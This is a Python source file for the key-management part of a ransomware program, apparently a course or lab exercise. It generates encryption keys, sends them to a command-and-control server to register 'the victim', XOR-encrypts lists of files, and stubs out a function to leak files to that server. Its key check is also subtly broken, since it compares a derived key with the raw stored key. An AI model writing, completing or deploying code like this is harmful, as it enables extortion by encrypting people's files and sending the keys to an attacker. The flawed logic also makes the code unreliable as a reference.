from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Derive a key from the salt and the key

        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
            backend=default_backend()
        )
        return kdf.derive(key)


    def create(self) -> Tuple[bytes, bytes, bytes]:
        # Generate salt, key, and token
        salt = os.urandom(self.SALT_LENGTH)
        key = os.urandom(self.KEY_LENGTH)
        token = os.urandom(self.TOKEN_LENGTH)

        return salt, key, token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

 
    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        url = f"http://{self._remote_host_port}/new"
        data = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
        }
        response = requests.post(url, json=data)

        if response.status_code != 200:
            self._log.error(f"Failed to send data to CNC: {response.text}")
        else:
            self._log.info("Data sent to CNC successfully")
    def setup(self) -> None:
        # Main function to create crypto data and register malware to CNC

        # Create the cryptographic elements: salt, key, and token
        self._salt = os.urandom(self.SALT_LENGTH)
        self._key = os.urandom(self.KEY_LENGTH)
        self._token = os.urandom(self.TOKEN_LENGTH)

        # Save the salt and token to local files
        os.makedirs(self._path, exist_ok=True)
        with open(os.path.join(self._path, "salt.bin"), "wb") as salt_file:
            salt_file.write(self._salt)
        with open(os.path.join(self._path, "token.bin"), "wb") as token_file:
            token_file.write(self._token)

        # Register the victim to the CNC by sending the data
        self.post_new(self._salt, self._key, self._token)


    def load(self) -> None:
        # Load salt and token from local files
        salt_path = os.path.join(self._path, "salt.bin")
        token_path = os.path.join(self._path, "token.bin")

        if os.path.exists(salt_path) and os.path.exists(token_path):
            with open(salt_path, "rb") as salt_file:
                self._salt = salt_file.read()
            with open(token_path, "rb") as token_file:
                self._token = token_file.read()
            self._log.info("Loaded salt and token from local files")
        else:
            self._log.error("Salt or token file not found")

    def check_key(self, candidate_key: bytes) -> bool:
        # Verify if the candidate key is valid
        derived_key = self.do_derivation(self._salt, candidate_key)

        # Compare the derived key with the stored key
        if self._key == derived_key:
            return True
        else:
            return False

    def set_key(self, b64_key: str) -> None:
        # Decode the base64 key and set it as the self._key if it's valid
        candidate_key = base64.b64decode(b64_key)

        if self.check_key(candidate_key):
            self._key = candidate_key
            self._log.info("Key set successfully")
        else:
            self._log.error("Invalid key provided")
            raise ValueError("Invalid key")


    def get_hex_token(self) -> str:
        # Return a string composed of hex symbols, regarding the token
        hashed_token = sha256(self._token).hexdigest()
        return hashed_token



    def xorfiles(self, files: List[str]) -> None:
        # XOR a list of files using the self._key
        for file_path in files:
            try:
                xorfile(file_path, self._key)
            except Exception as e:
                self._log.error(f"Error encrypting file {file_path}: {e}")

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self) -> None:
        # Remove the local cryptographic files
        salt_file = os.path.join(self._path, "salt.bin")
        token_file = os.path.join(self._path, "token.bin")

        try:
            if os.path.exists(salt_file):
                os.remove(salt_file)
                self._log.info("Salt file removed")

            if os.path.exists(token_file):
                os.remove(token_file)
                self._log.info("Token file removed")

        except Exception as e:
            self._log.error(f"Error cleaning local cryptographic files: {e}")
            raise
